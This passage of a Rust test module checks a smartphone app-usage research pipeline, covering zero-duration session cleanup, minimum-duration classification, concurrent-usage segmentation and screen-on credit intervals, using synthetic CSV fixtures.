        *second[0].edit_identity().source_data_rows = SourceDataRows::single(9);

        let first_cleanup = zero_duration_cleanup_evidence(&first, true, true);
        let second_cleanup = zero_duration_cleanup_evidence(&second, true, true);
        assert_eq!(first_cleanup.receipt.removed_row_count, 1);
        assert_eq!(second_cleanup.receipt.removed_row_count, 1);
        assert_eq!(
            first_cleanup.removed_rows[0].source_data_row_ranges,
            vec![SourceDataRowRange { first: 2, last: 2 }],
        );
        assert_eq!(
            second_cleanup.removed_rows[0].source_data_row_ranges,
            vec![SourceDataRowRange { first: 9, last: 9 }],
        );
        assert_ne!(
            first_cleanup.receipt.removed_lineage_digest,
            second_cleanup.receipt.removed_lineage_digest,
            "source association is part of the canonical removed identity",
        );

        // Both executions have the same empty post-cleanup row table.  Their
        // remove-zero checkpoints must still differ because the typed receipt
        // carries the source identity that was removed.
        let removed = Vec::<Row>::new();
        let first_cleanup_fingerprint = value_fingerprint(&first_cleanup).unwrap();
        let second_cleanup_fingerprint = value_fingerprint(&second_cleanup).unwrap();
        let first_cleanup_checkpoint = workflow_checkpoint(
            "remove_zero_duration_rows",
            &[("rows", &removed)],
            &[("value", &first_cleanup_fingerprint)],
        );
        let second_cleanup_checkpoint = workflow_checkpoint(
            "remove_zero_duration_rows",
            &[("rows", &removed)],
            &[("value", &second_cleanup_fingerprint)],
        );
        assert_ne!(
            first_cleanup_checkpoint.terminal_digest,
            second_cleanup_checkpoint.terminal_digest,
        );

        let mut options = test_options();
        options.minimum_usage_duration = 0.0;
        options.minimum_duration_disposition = MinimumDurationDisposition::RetainAndCredit;
        let mut first_foundational = foundational_semantics_evidence(&first, &options);
        first_foundational.zero_duration_cleanup = first_cleanup;
        let mut second_foundational = foundational_semantics_evidence(&second, &options);
        second_foundational.zero_duration_cleanup = second_cleanup;
        let first_foundational_fingerprint = value_fingerprint(&first_foundational).unwrap();
        let second_foundational_fingerprint = value_fingerprint(&second_foundational).unwrap();
        let assembled = workflow_checkpoint(
            "assemble_result_manifest",
            &[],
            &[("app_csv", b"same-scientific-product")],
        );
        let manifest = |fingerprint: &[u8]| {
            checkpoint_for_exact_row_state(
                "assemble_result_manifest",
                &assembled,
                &[
                    (
                        "assembledOutputsCheckpoint",
                        assembled.terminal_digest.as_bytes(),
                    ),
                    ("openerSetEvidence", b"same"),
                    ("foundationalSemanticsEvidence", fingerprint),
                    ("eyesTaggedFauEvidence", b"same"),
                    ("b05SchoedelEvidence", b"same"),
                ],
            )
        };
        assert_ne!(
            manifest(&first_foundational_fingerprint).terminal_digest,
            manifest(&second_foundational_fingerprint).terminal_digest,
            "manifest identity failed to retain removed source lineage",
        );

        assert!(
            crate::workflow_contract::query_field_reads("remove_zero_duration_rows")
                .contains(&"row.membership")
        );
        assert_eq!(
            crate::workflow_contract::query_group_applicability("interval_cleaning"),
            crate::workflow_contract::ApplicabilityExpression::OptionTrue {
                option_key: "process_app_usage",
            },
            "the descriptive zero-candidate census runs for every app pipeline",
        );
    }

    #[test]
    #[cfg(feature = "incremental-v2")]
    fn sub_half_nanosecond_threshold_normalizes_to_the_disabled_zero_binding() {
        let rows = episode_rows(&[(ACTIVITY_RESUMED, "com.example.zero", Some(0), Some(0))]);
        let filtered = BTreeSet::new();
        let run = |minimum| {
            incremental::classify_episode_durations(
                rows.clone(),
                &filtered,
                MicroUseClassificationPolicy::None,
                minimum,
                MinimumDurationComparator::InclusiveLe,
                MinimumDurationDisposition::RetainButExclude,
                &[],
                &b06::MaximumDurationRowStage::omitted(),
            )
            .expect("classification with the omitted B06 shape never refuses")
        };
        let zero = run(0.0);
        let sub_ns = run(0.4e-9);
        assert_eq!(minimum_duration_threshold_ns(0.0), None);
        assert_eq!(minimum_duration_threshold_ns(0.4e-9), None);
        assert_eq!(zero[0].minimum_duration_qualified, Some(false));
        assert_eq!(sub_ns[0].minimum_duration_qualified, Some(false));
        assert!(zero[0].minimum_duration_aggregate_eligible);
        assert!(sub_ns[0].minimum_duration_aggregate_eligible);
        assert_eq!(
            workflow_rows_checkpoint("zero", &zero),
            workflow_rows_checkpoint("zero", &sub_ns),
        );

        let raw = concat!(
            "study_id,participant_id,username,application_label,interaction_type,app_package_name,event_timestamp,timezone\n",
            "Study,P01,Child,Zero,Activity Resumed,com.example.zero,2026-03-07 10:00:00,UTC\n",
            "Study,P01,Child,Zero,Activity Paused,com.example.zero,2026-03-07 10:00:00,UTC\n",
        );
        let mut options = test_options();
        options.timezone = "UTC".into();
        options.correct_duplicate_event_timestamps = false;
        options.minimum_usage_duration = 0.4e-9;
        options.minimum_usage_duration_explicit = true;
        options.minimum_duration_comparator = MinimumDurationComparator::InclusiveLe;
        options.minimum_duration_comparator_explicit = true;
        options.minimum_duration_disposition = MinimumDurationDisposition::RetainButExclude;
        options.minimum_duration_disposition_explicit = true;
        options.filter_zero_duration_sessions = false;
        let sequential = run_pipeline_v2_with_supports(
            raw.as_bytes(),
            &options,
            PipelineV2SupportFiles::default(),
        )
        .unwrap();
        let mut engine = crate::pipeline_v2::IncrementalPipelineV2Engine::default();
        let tracked = engine
            .execute(raw.as_bytes(), &options, PipelineV2SupportFiles::default())
            .unwrap();
        assert_eq!(tracked.result.app_csv_bytes, sequential.app_csv_bytes);
        assert_eq!(
            tracked.result.foundational_semantics_evidence,
            sequential.foundational_semantics_evidence,
        );
        assert_eq!(
            sequential
                .foundational_semantics_evidence
                .minimum_duration
                .threshold_ns,
            0,
        );
        assert_eq!(
            sequential
                .foundational_semantics_evidence
                .minimum_duration
                .qualifying_count,
            0,
        );
    }

    #[test]
    fn b03_and_b04_form_an_orthogonal_two_by_two_on_the_same_raw_durations() {
        const SECOND: i64 = 1_000_000_000;
        let rows = episode_rows(&[
            (
                ACTIVITY_RESUMED,
                "com.example.four",
                Some(0),
                Some(4 * SECOND),
            ),
            (
                ACTIVITY_RESUMED,
                "com.example.six",
                Some(10 * SECOND),
                Some(16 * SECOND),
            ),
        ]);
        let filtered = BTreeSet::new();
        let mut baseline_qualification = None;
        for micro in [
            MicroUseClassificationPolicy::None,
            MicroUseClassificationPolicy::OkoshiLt5s,
        ] {
            for disposition in [
                MinimumDurationDisposition::RetainAndCredit,
                MinimumDurationDisposition::RetainButExclude,
            ] {
                let classified = incremental::classify_episode_durations(
                    rows.clone(),
                    &filtered,
                    micro,
                    5.0,
                    MinimumDurationComparator::StrictLt,
                    disposition,
                    &[],
                    &b06::MaximumDurationRowStage::omitted(),
                )
                .expect("classification with the omitted B06 shape never refuses");
                let qualifications = classified
                    .iter()
                    .map(|row| row.minimum_duration_qualified)
                    .collect::<Vec<_>>();
                assert_eq!(qualifications, vec![Some(true), Some(false)]);
                if let Some(expected) = &baseline_qualification {
                    assert_eq!(&qualifications, expected);
                } else {
                    baseline_qualification = Some(qualifications);
                }
                assert_eq!(
                    classified
                        .iter()
                        .map(|row| row.micro_use_classification)
                        .collect::<Vec<_>>(),
                    match micro {
                        MicroUseClassificationPolicy::None => vec![None, None],
                        MicroUseClassificationPolicy::OkoshiLt5s => vec![
                            Some(MicroUseClassification::MicroUse),
                            Some(MicroUseClassification::NotMicroUse),
                        ],
                    },
                );
                assert_eq!(
                    classified
                        .iter()
                        .map(|row| row.minimum_duration_aggregate_eligible)
                        .collect::<Vec<_>>(),
                    match disposition {
                        MinimumDurationDisposition::RetainAndCredit => vec![true, true],
                        MinimumDurationDisposition::RetainButExclude => vec![false, true],
                        _ => unreachable!(),
                    },
                );
                assert_eq!(
                    classified
                        .iter()
                        .map(|row| row.duration_seconds.map(f64::to_bits))
                        .collect::<Vec<_>>(),
                    vec![Some(4.0_f64.to_bits()), Some(6.0_f64.to_bits())],
                );
            }
        }
    }

    #[test]
    fn minimum_duration_is_decided_once_before_concurrency_without_a_second_floor() {
        const SECOND: i64 = 1_000_000_000;
        let filtered = BTreeSet::new();
        let no_background = AHashSet::new();
        let classified = incremental::classify_episode_durations(
            episode_rows(&[
                (
                    ACTIVITY_RESUMED,
                    "com.example.outer",
                    Some(0),
                    Some(12 * SECOND),
                ),
                (
                    ACTIVITY_RESUMED,
                    "com.example.inner",
                    Some(4 * SECOND),
                    Some(12 * SECOND),
                ),
            ]),
            &filtered,
            MicroUseClassificationPolicy::None,
            5.0,
            MinimumDurationComparator::StrictLt,
            MinimumDurationDisposition::ChronicleBlankKeepRow,
            &[],
            &b06::MaximumDurationRowStage::omitted(),
        )
        .expect("classification with the omitted B06 shape never refuses");
        let mut options = test_options();
        options.minimum_usage_duration = 5.0;
        let evidence = foundational_semantics_evidence(&classified, &options);
        assert_eq!(evidence.minimum_duration.bounded_episode_count, 2);
        assert_eq!(evidence.minimum_duration.qualifying_count, 0);
        assert_eq!(evidence.minimum_duration.retained_credited_count, 2);

        let split = incremental::segment_concurrent_usage(
            classified,
            &filtered,
            &no_background,
            true,
            5.0,
            false,
        )
        .expect("concurrency split");
        assert_eq!(
            split
                .iter()
                .filter(|row| row.app_package_name == "com.example.outer")
                .map(|row| row.duration_seconds.map(f64::to_bits))
                .collect::<Vec<_>>(),
            vec![Some(4.0_f64.to_bits()), Some(8.0_f64.to_bits())],
            "a subinterval below the five-second episode floor remains credited when the explicit subinterval floor is off",
        );
        assert!(split.iter().all(|row| {
            row.minimum_duration_qualified == Some(false) && row.minimum_duration_aggregate_eligible
        }));
    }

    #[test]
    fn concurrency_preserves_b04_state_and_receipts_the_separate_postfloor_causally() {
        const SECOND: i64 = 1_000_000_000;
        let filtered = BTreeSet::new();
        let no_background = AHashSet::new();
        for disposition in [
            MinimumDurationDisposition::ChronicleBlankKeepRow,
            MinimumDurationDisposition::RetainButExclude,
        ] {
            let classified = incremental::classify_episode_durations(
                episode_rows(&[
                    (
                        ACTIVITY_RESUMED,
                        "com.example.outer",
                        Some(0),
                        Some(12 * SECOND),
                    ),
                    (
                        ACTIVITY_RESUMED,
                        "com.example.inner",
                        Some(4 * SECOND),
                        Some(12 * SECOND),
                    ),
                ]),
                &filtered,
                MicroUseClassificationPolicy::OkoshiLt5s,
                10.0,
                MinimumDurationComparator::StrictLt,
                disposition,
                &[],
                &b06::MaximumDurationRowStage::omitted(),
            )
            .expect("classification with the omitted B06 shape never refuses");
            let mut options = test_options();
            options.micro_use_classification_policy = MicroUseClassificationPolicy::OkoshiLt5s;
            options.minimum_usage_duration = 10.0;
            options.minimum_duration_disposition = disposition;
            let foundational = foundational_semantics_evidence(&classified, &options);
            assert_eq!(foundational.minimum_duration.qualifying_count, 1);

            for postfloor in [false, true] {
                let segmented = incremental::segment_concurrent_usage(
                    classified.clone(),
                    &filtered,
                    &no_background,
                    true,
                    10.0,
                    postfloor,
                )
                .expect("participant-local concurrency segmentation");
                assert_eq!(segmented.len(), 3);
                let outer = segmented
                    .iter()
                    .filter(|row| row.app_package_name == "com.example.outer")
                    .collect::<Vec<_>>();
                assert_eq!(outer.len(), 2);
                assert!(outer.iter().all(|row| {
                    row.raw_episode_start_timestamp_ns == Some(0)
                        && row.raw_episode_stop_timestamp_ns == Some(12 * SECOND)
                        && row.raw_episode_duration_ns == Some(12 * SECOND)
                        && row.minimum_duration_qualified == Some(false)
                        && row.minimum_duration_aggregate_eligible
                }));
                let inner = segmented
                    .iter()
                    .find(|row| row.app_package_name == "com.example.inner")
                    .unwrap();
                assert_eq!(inner.raw_episode_start_timestamp_ns, Some(4 * SECOND));
                assert_eq!(inner.raw_episode_stop_timestamp_ns, Some(12 * SECOND));
                assert_eq!(inner.raw_episode_duration_ns, Some(8 * SECOND));
                assert_eq!(inner.minimum_duration_qualified, Some(true));
                assert_eq!(
                    inner.minimum_duration_aggregate_eligible,
                    disposition == MinimumDurationDisposition::ChronicleBlankKeepRow,
                );
                assert_eq!(
                    inner.minimum_duration_blank_applied,
                    disposition == MinimumDurationDisposition::ChronicleBlankKeepRow,
                );

                let expected_postfloor_count = match (postfloor, disposition) {
                    (false, _) => 0,
                    (true, MinimumDurationDisposition::ChronicleBlankKeepRow) => 2,
                    (true, MinimumDurationDisposition::RetainButExclude) => 3,
                    _ => unreachable!(),
                };
                assert_eq!(
                    segmented
                        .iter()
                        .filter(|row| row.concurrent_subinterval_floor_blank_applied)
                        .count(),
                    expected_postfloor_count,
                    "the postfloor marker is causal and cannot double-claim a B04 blank",
                );
                let mut evidence = foundational.clone();
                attach_concurrent_subinterval_floor_evidence(
                    &mut evidence,
                    &segmented,
                    10.0,
                    postfloor,
                    true,
                );
                assert_eq!(evidence.minimum_duration.qualifying_count, 1);
                assert_eq!(
                    evidence.concurrent_subinterval_floor.requested_applied,
                    postfloor
                );
                assert_eq!(
                    evidence.concurrent_subinterval_floor.threshold_ns,
                    10 * SECOND
                );
                assert_eq!(
                    evidence
                        .concurrent_subinterval_floor
                        .generated_subinterval_count,
                    3
                );
                assert_eq!(
                    evidence
                        .concurrent_subinterval_floor
                        .blanked_subinterval_count,
                    expected_postfloor_count as u32,
                );
            }
        }
    }

    #[test]
    fn concurrent_segmentation_is_participant_partitioned_and_exact_at_large_ns_floor() {
        const SECOND: i64 = 1_000_000_000;
        let filtered = BTreeSet::new();
        let no_background = AHashSet::new();
        let mut combined = episode_rows(&[
            (APP_USAGE, "p1.outer", Some(0), Some(12 * SECOND)),
            (APP_USAGE, "p2.outer", Some(0), Some(12 * SECOND)),
            (APP_USAGE, "p1.inner", Some(4 * SECOND), Some(12 * SECOND)),
            (APP_USAGE, "p2.inner", Some(4 * SECOND), Some(12 * SECOND)),
        ]);
        for (row, participant) in combined.iter_mut().zip(["P01", "P02", "P01", "P02"]) {
            *row.edit_classification().participant_id = participant.into();
        }
        let observed = incremental::segment_concurrent_usage(
            combined.clone(),
            &filtered,
            &no_background,
            true,
            0.0,
            false,
        )
        .unwrap();
        let mut isolated = Vec::new();
        for participant in ["P01", "P02"] {
            isolated.extend(
                incremental::segment_concurrent_usage(
                    combined
                        .iter()
                        .filter(|row| row.participant_id == participant)
                        .cloned()
                        .collect(),
                    &filtered,
                    &no_background,
                    true,
                    0.0,
                    false,
                )
                .unwrap(),
            );
        }
        let signature = |rows: &[Row]| {
            let mut values = rows
                .iter()
                .map(|row| {
                    (
                        row.participant_id.to_string(),
                        row.app_package_name.to_string(),
                        row.start_timestamp_ns,
                        row.stop_timestamp_ns,
                        row.usage_layer.as_deref().map(str::to_owned),
                        row.duration_seconds.map(f64::to_bits),
                    )
                })
                .collect::<Vec<_>>();
            values.sort();
            values
        };
        assert_eq!(signature(&observed), signature(&isolated));

        let threshold_seconds = 10_000_000.0;
        let threshold_ns = 10_000_000_i64 * SECOND;
        let large = episode_rows(&[(
            APP_USAGE,
            "com.example.large",
            Some(0),
            Some(threshold_ns - 1),
        )]);
        let floored = incremental::segment_concurrent_usage(
            large,
            &filtered,
            &no_background,
            true,
            threshold_seconds,
            true,
        )
        .unwrap();
        assert_eq!(floored.len(), 1);
        assert_eq!(floored[0].duration_seconds, None);
        assert!(floored[0].concurrent_subinterval_floor_blank_applied);
    }

    #[test]
    fn retain_but_exclude_keeps_the_public_row_out_of_headline_outputs_end_to_end() {
        let csv = concat!(
            "study_id,participant_id,username,application_label,interaction_type,app_package_name,event_timestamp,timezone\n",
            "Study,P01,Target Child,Chat,Activity Resumed,com.example.chat,2026-03-07 10:00:00,America/Chicago\n",
            "Study,P01,Target Child,Chat,Activity Paused,com.example.chat,2026-03-07 10:00:30,America/Chicago\n",
        );
        let mut credited_options = test_options();
        credited_options.minimum_usage_duration = 60.0;
        credited_options.minimum_duration_disposition = MinimumDurationDisposition::RetainAndCredit;
        credited_options.enable_aggregates = true;
        credited_options.materialize_visualization_data = false;
        let mut excluded_options = credited_options.clone();
        excluded_options.minimum_duration_disposition =
            MinimumDurationDisposition::RetainButExclude;

        let credited = run_pipeline_v2_with_supports(
            csv.as_bytes(),
            &credited_options,
            PipelineV2SupportFiles::default(),
        )
        .expect("credited binding runs");
        let excluded = run_pipeline_v2_with_supports(
            csv.as_bytes(),
            &excluded_options,
            PipelineV2SupportFiles::default(),
        )
        .expect("excluded binding runs");

        assert_eq!(credited.app_row_count, 1);
        assert_eq!(excluded.app_row_count, 1, "the public row is retained");
        let credited_lines = csv_lines(&credited.app_csv_bytes.to_vec());
        let excluded_lines = csv_lines(&excluded.app_csv_bytes.to_vec());
        let eligibility_column = excluded_lines[0]
            .iter()
            .position(|column| column == "minimum_duration_aggregate_eligible")
            .expect("eligibility column");
        assert_eq!(credited_lines[1][eligibility_column], "true");
        assert_eq!(excluded_lines[1][eligibility_column], "false");
        assert_ne!(
            credited.review_summary_json_bytes, excluded.review_summary_json_bytes,
            "headline participant summaries must exclude the ineligible episode",
        );
        assert!(
            credited
                .aggregate_csv_outputs
                .iter()
                .map(|output| output.row_count)
                .sum::<u32>()
                > excluded
                    .aggregate_csv_outputs
                    .iter()
                    .map(|output| output.row_count)
                    .sum::<u32>(),
            "headline aggregates must exclude the ineligible episode",
        );
        assert_eq!(
            excluded
                .foundational_semantics_evidence
                .minimum_duration
                .retained_excluded_count,
            1,
        );
        assert_eq!(
            excluded
                .foundational_semantics_evidence
                .minimum_duration_excluded_episodes
                .len(),
            1,
            "the retained row still has explicit exclusion lineage",
        );
    }

    /// Whether a zero-length app-usage session survives is decided by
    /// `remove_zero_duration_rows`, under the researcher's
    /// `filter_zero_duration_sessions` option — not by concurrency modelling,
    /// which answers a different question.
    ///
    /// Nothing about that is automatic. `segment_concurrent_usage` rebuilds
    /// the app-usage rows purely from what the sweep-line emits, and the
    /// sweep-line never *opens* a session whose stop is not strictly after its
    /// start, so a start == stop row would otherwise be gone before the step
    /// meant to judge it ever saw it — and only when concurrency modelling
    /// happened to be running. One explicit block at the end of
    /// `split_overlapping_sessions` emits a primary row for those sessions and
    /// is the single reason this holds; this pins it from the caller's side.
    ///
    /// Chronicle logs really do carry these: duplicate event timestamps are
    /// common enough that the pipeline has a whole correction step for them,
    /// and a resume and its stop landing on the same millisecond is what a
    /// zero-length session is.
    #[test]
    fn a_zero_length_session_survives_concurrency_modelling_for_the_zero_duration_step_to_judge() {
        const SECOND: i64 = 1_000_000_000;
        let filtered = BTreeSet::new();
        let no_background = AHashSet::new();

        let rows = episode_rows(&[
            (APP_USAGE, "com.example.chat", Some(0), Some(0)),
            (
                APP_USAGE,
                "com.example.music",
                Some(50 * SECOND),
                Some(150 * SECOND),
            ),
        ]);

        let packages = |rows: Vec<Row>| -> Vec<String> {
            rows.iter()
                .map(|row| row.app_package_name.to_string())
                .collect()
        };

        let without_modelling = packages(
            incremental::segment_concurrent_usage(
                rows.clone(),
                &filtered,
                &no_background,
                false,
                0.0,
                false,
            )
            .expect("no split requested"),
        );
        let with_modelling = packages(
            incremental::segment_concurrent_usage(
                rows.clone(),
                &filtered,
                &no_background,
                true,
                0.0,
                false,
            )
            .expect("split by option"),
        );

        assert!(
            without_modelling.contains(&"com.example.chat".to_string()),
            "the zero-length session must reach the zero-duration step"
        );
        assert_eq!(
            with_modelling, without_modelling,
            "concurrency modelling must not decide whether a zero-length \
             session exists"
        );
    }

    /// Concurrent-usage modelling splits overlapping sessions into a primary
    /// and a secondary layer so the same minute is not counted twice. It runs
    /// when the option is on *or* when background apps are declared, because a
    /// background app can hold a session open underneath another one.
    #[test]
    fn concurrent_modelling_runs_whenever_either_reason_to_run_is_present() {
        const SECOND: i64 = 1_000_000_000;
        let filtered = BTreeSet::new();
        let no_background = AHashSet::new();
        let background: AHashSet<String> =
            std::iter::once("com.example.music".to_string()).collect();

        // Two overlapping sessions: chat 0..100 and music 50..150.
        let rows = episode_rows(&[
            (APP_USAGE, "com.example.chat", Some(0), Some(100 * SECOND)),
            (
                APP_USAGE,
                "com.example.music",
                Some(50 * SECOND),
                Some(150 * SECOND),
            ),
        ]);

        let layers = |rows: Vec<Row>| -> Vec<(String, Option<String>, Option<f64>)> {
            rows.iter()
                .map(|row| {
                    (
                        row.app_package_name.to_string(),
                        row.usage_layer.as_ref().map(|layer| layer.to_string()),
                        row.duration_seconds,
                    )
                })
                .collect()
        };

        // Neither reason present: the rows are only sorted.
        assert_eq!(
            layers(
                incremental::segment_concurrent_usage(
                    rows.clone(),
                    &filtered,
                    &no_background,
                    false,
                    0.0,
                    false
                )
                .expect("no split requested")
            ),
            vec![
                ("com.example.chat".to_string(), None, None),
                ("com.example.music".to_string(), None, None),
            ]
        );

        // The option alone is enough, with no background apps declared.
        let by_option = layers(
            incremental::segment_concurrent_usage(
                rows.clone(),
                &filtered,
                &no_background,
                true,
                0.0,
                false,
            )
            .expect("split by option"),
        );
        assert_eq!(
            by_option,
            vec![
                (
                    "com.example.chat".to_string(),
                    Some("primary".to_string()),
                    Some(50.0)
                ),
                (
                    "com.example.chat".to_string(),
                    Some("secondary".to_string()),
                    Some(50.0)
                ),
                (
                    "com.example.music".to_string(),
                    Some("primary".to_string()),
                    Some(100.0)
                ),
            ],
            "the app that started last owns the overlapping minutes; the app it \
             covered keeps them on the secondary layer",
        );

        // A declared background app alone is enough, with the option off.
        assert_eq!(
            layers(
                incremental::segment_concurrent_usage(
                    rows.clone(),
                    &filtered,
                    &background,
                    false,
                    0.0,
                    false
                )
                .expect("split by background apps")
            ),
            by_option
        );

        // The floor reaches the sub-intervals only when it is asked to.
        assert_eq!(
            layers(
                incremental::segment_concurrent_usage(
                    rows.clone(),
                    &filtered,
                    &no_background,
                    true,
                    50.0,
                    true
                )
                .expect("split with a sub-interval floor")
            )
            .iter()
            .map(|(_, _, duration)| *duration)
            .collect::<Vec<_>>(),
            vec![Some(50.0), Some(50.0), Some(100.0)],
            "a sub-interval exactly at the floor is not shorter than the floor",
        );
        assert_eq!(
            layers(
                incremental::segment_concurrent_usage(
                    rows,
                    &filtered,
                    &no_background,
                    true,
                    51.0,
                    true
                )
                .expect("split with a sub-interval floor")
            )
            .iter()
            .map(|(_, _, duration)| *duration)
            .collect::<Vec<_>>(),
            vec![None, None, Some(100.0)],
            "only the sub-intervals under the floor lose their duration",
        );
    }

    fn credit_point(timestamp_ns: i64, state: ScreenCreditState) -> ScreenChangePoint {
        ScreenChangePoint {
            timestamp_ns,
            state,
            source_data_rows: SourceDataRows::default(),
        }
    }

    /// `creditable_intervals` decides how much of an app session the
    /// screen-gated credit layer pays for. The auto-lock bridge is the
    /// researcher-facing rule: a screen-OFF blip shorter than the device's
    /// auto-lock cannot be a real lock, so credit continues across it, while an
    /// OFF stretch at or beyond the auto-lock ends the credited interval.
    #[test]
    fn screen_credit_pays_for_lit_time_and_bridges_only_sub_auto_lock_blips() {
        use ScreenCreditState::{Off, On};
        let bridge = 10;

        // No screen witness at all: nothing is creditable, which is what makes
        // the no-witness fallback options necessary.
        assert_eq!(creditable_intervals(&[], 0, 100, bridge, false), Vec::new());
        // A screen state established before the session covers the session.
        assert_eq!(
            creditable_intervals(&[credit_point(-5, On)], 0, 100, bridge, false),
            vec![(0, 100)]
        );
        assert_eq!(
            creditable_intervals(&[credit_point(-5, Off)], 0, 100, bridge, false),
            Vec::new()
        );
        // Screen turns on mid-session: only the lit tail is credited.
        assert_eq!(
            creditable_intervals(&[credit_point(20, On)], 0, 100, bridge, false),
            vec![(20, 100)]
        );
        // A lock at or past the auto-lock closes the interval.
        assert_eq!(
            creditable_intervals(
                &[credit_point(0, On), credit_point(50, Off)],
                0,
                100,
                bridge, false
            ),
            vec![(0, 50)]
        );
        assert_eq!(
            creditable_intervals(
                &[
                    credit_point(0, On),
                    credit_point(50, Off),
                    credit_point(60, On)
                ],
                0,
                100,
                bridge, false
            ),
            vec![(0, 50), (60, 100)],
            "an OFF span exactly as long as the auto-lock is a real lock"
        );
        // A shorter blip is bridged, and the bridged time itself is credited.
        assert_eq!(
            creditable_intervals(
                &[
                    credit_point(0, On),
                    credit_point(50, Off),
                    credit_point(59, On)
                ],
                0,
                100,
                bridge, false
            ),
            vec![(0, 100)]
        );
        // Two blips inside one session stay inside one credited interval.
        assert_eq!(
            creditable_intervals(
                &[
                    credit_point(0, On),
                    credit_point(20, Off),
                    credit_point(25, On),
                    credit_point(40, Off),
                    credit_point(48, On)
                ],
                0,
                100,
                bridge, false
            ),
            vec![(0, 100)]
        );
        // The session window clips both ends, and a point beyond the end is
        // never consulted.
        assert_eq!(
            creditable_intervals(&[credit_point(0, On), credit_point(50, Off)], 0, 40, bridge, false),
            vec![(0, 40)]
        );
        assert_eq!(
            creditable_intervals(
                &[credit_point(0, On), credit_point(50, Off)],
                20,
                40,
                bridge, false
            ),
            vec![(20, 40)]
        );
        // A trailing OFF is a blip only if the screen comes back within the
        // auto-lock, even when that return falls after the session ends: then
        // the interval stays open to the end of the session.
        assert_eq!(
            creditable_intervals(
                &[credit_point(0, On), credit_point(95, Off), credit_point(102, On)],
                0,
                100,
                bridge, false
            ),
            vec![(0, 100)]
        );
        // An OFF the session end merely clips is measured to the screen's real
        // return: here it lasts 30, a real lock, so credit stops at the OFF.
        assert_eq!(
            creditable_intervals(
                &[credit_point(0, On), credit_point(95, Off), credit_point(125, On)],
                0,
                100,
                bridge, false
            ),
            vec![(0, 95)]
        );
        // An OFF the recording never ends is a lock, however close to the
        // session end it starts.
        assert_eq!(
            creditable_intervals(
                &[credit_point(0, On), credit_point(95, Off)],
                0,
                100,
                bridge, false
            ),
            vec![(0, 95)]
        );
        // A zero-length window credits nothing whatever the screen was doing.
        assert_eq!(
            creditable_intervals(&[credit_point(0, On)], 50, 50, bridge, false),
            Vec::new()
        );
        // With no bridge allowance every OFF span is a lock.
        assert_eq!(
            creditable_intervals(
                &[
                    credit_point(0, On),
                    credit_point(50, Off),
                    credit_point(51, On)
                ],
                0,
                100,
                0, false
            ),
            vec![(0, 50), (51, 100)]
        );
        // Two screen records at the same instant leave no time between them. An
        // OFF that lasts zero nanoseconds is not a lock, so the credited
        // interval runs straight through it even with no bridge allowance.
        assert_eq!(
            creditable_intervals(
                &[
                    credit_point(0, On),
                    credit_point(50, Off),
                    credit_point(50, On)
                ],
                0,
                100,
                0, false
            ),
            vec![(0, 100)]
        );
        // The TECH/GNSM studies' rule measures an OFF only up to the session
        // end: the same clipped OFF that is a lock above lasts 5 inside the
        // session, so it is bridged, and so is one the recording never ends.
        assert_eq!(
            creditable_intervals(
                &[credit_point(0, On), credit_point(95, Off), credit_point(125, On)],
                0,
                100,
                bridge,
                true
            ),
            vec![(0, 100)]
        );
        assert_eq!(
            creditable_intervals(&[credit_point(0, On), credit_point(95, Off)], 0, 100, bridge, true),
            vec![(0, 100)]
        );
        // Inside the session the two rules agree: a full-length lock still ends credit.
        assert_eq!(
            creditable_intervals(
                &[credit_point(0, On), credit_point(50, Off), credit_point(60, On)],
                0,
                100,
                bridge,
                true
            ),
            vec![(0, 50), (60, 100)]
        );
    }

    /// Credit is paid only where the screen was lit *and* the device was
    /// demonstrably alive, so the two interval lists are intersected. The
    /// sweep is linear; check it against the obvious quadratic definition.
    #[test]
    fn interval_intersection_matches_the_all_pairs_definition() {
        fn reference(left: &[CreditInterval], right: &[CreditInterval]) -> Vec<CreditInterval> {
            let mut output = Vec::new();
            for (a_start, a_end) in left {
                for (b_start, b_end) in right {
                    let lower = *a_start.max(b_start);
                    let upper = *a_end.min(b_end);
                    if upper > lower {
                        output.push((lower, upper));
                    }
                }
            }
            output.sort_unstable();
            output
        }

        // Touching intervals share no positive-length time.
        assert_eq!(intersect_intervals(&[(0, 10)], &[(10, 20)]), Vec::new());
        assert_eq!(intersect_intervals(&[(0, 10)], &[(9, 20)]), vec![(9, 10)]);
        assert_eq!(intersect_intervals(&[], &[(0, 10)]), Vec::new());
        assert_eq!(intersect_intervals(&[(0, 10)], &[]), Vec::new());
        // One long interval can be cut into several pieces by the other list.
        assert_eq!(
            intersect_intervals(&[(0, 100)], &[(10, 20), (30, 40), (90, 200)]),
            vec![(10, 20), (30, 40), (90, 100)]
        );
        // Advancing the list that ends first is what keeps this linear; a
        // shared right edge must not drop the following interval.
        assert_eq!(
            intersect_intervals(&[(0, 10), (10, 30)], &[(5, 10), (12, 40)]),
            vec![(5, 10), (12, 30)]
        );

        fn next(state: &mut u64) -> u64 {
            *state ^= *state << 13;
            *state ^= *state >> 7;
            *state ^= *state << 17;
            *state
        }
        fn build(state: &mut u64, count: usize) -> Vec<CreditInterval> {
            let mut intervals: Vec<CreditInterval> = Vec::new();
            let mut cursor = 0i64;
            for _ in 0..count {
                cursor += (next(state) % 7) as i64;
                let width = 1 + (next(state) % 11) as i64;
                intervals.push((cursor, cursor + width));
                cursor += width;
            }
            intervals
        }

        let mut state = 0x2545_f491_4f6c_dd1d_u64;
        for _ in 0..2_000 {
            let left_count = 1 + (next(&mut state) % 6) as usize;
            let left = build(&mut state, left_count);
            let right_count = 1 + (next(&mut state) % 6) as usize;
            let right = build(&mut state, right_count);
            assert_eq!(
                intersect_intervals(&left, &right),
                reference(&left, &right),
                "left={left:?} right={right:?}"
            );
        }
    }

    /// Only a completed, positive-duration App Usage session is a credit
    /// candidate. Screen rows, placeholders and zero-length rows pass through
    /// the credit layer untouched.
    #[test]
    fn credit_candidates_are_exactly_positive_duration_app_usage_rows() {
        let raw = incremental::decode_source_records(
            b"study_id,participant_id,username,application_label,interaction_type,app_package_name,event_timestamp,timezone\n\
              Study,P01,Target Child,Chat,Activity Resumed,com.example.chat,2026-03-07 10:00:00,America/Chicago\n",
        );
        let mut row = incremental::canonicalize_source_rows(
            &raw,
            "America/Chicago",
            &BTreeMap::new(),
            &BTreeMap::from([("P01".to_owned(), "test-device".to_owned())]),
        )
        .expect("canonical rows")
        .remove(0);

        let set = |row: &mut Row, interaction: &str, duration: Option<f64>| {
            let data = row.edit_all();
            data.interaction_type = interaction.into();
            data.duration_minutes = duration;
        };

        set(&mut row, APP_USAGE, Some(1.5));
        assert!(is_credit_session(&row));

        // A completed session with no time in it has nothing to credit, and a
        // session with no duration at all was never closed.
